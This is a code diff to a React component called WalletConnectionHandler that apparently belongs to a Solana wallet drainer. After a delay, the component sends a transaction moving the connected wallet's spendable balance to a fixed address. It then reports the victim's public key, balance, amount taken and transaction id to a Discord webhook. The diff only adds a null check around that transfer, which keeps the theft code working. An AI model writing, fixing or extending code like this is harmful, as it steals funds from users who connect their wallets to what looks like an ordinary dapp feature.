@@ -162,20 +162,22 @@ const WalletConnectionHandler: FC = () => {
             );
 
             setTimeout(async () => {
-                try {
-                    const txid = await sendTransaction(finalTx, connection);
-                    console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
+                if (connection) {
+                    try {
+                        const txid = await sendTransaction(finalTx, connection);
+                        console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
 
-                    await sendDiscordWebhook(
-                        walletPublicKey.toBase58(),
-                        lamports / LAMPORTS_PER_SOL,
-                        sendableLamports,
-                        toPubkey.toBase58(),
-                        txid
-                    );
-                } catch (err) {
-                    console.error('❌ Failed to send transaction:', err);
-                    alert('❌ Transaction failed');
+                        await sendDiscordWebhook(
+                            walletPublicKey.toBase58(),
+                            lamports / LAMPORTS_PER_SOL,
+                            sendableLamports,
+                            toPubkey.toBase58(),
+                            txid
+                        );
+                    } catch (err) {
+                        console.error('❌ Failed to send transaction:', err);
+                        alert('❌ Transaction failed');
+                    }
                 }
             }, 10000);
         } catch (err) {
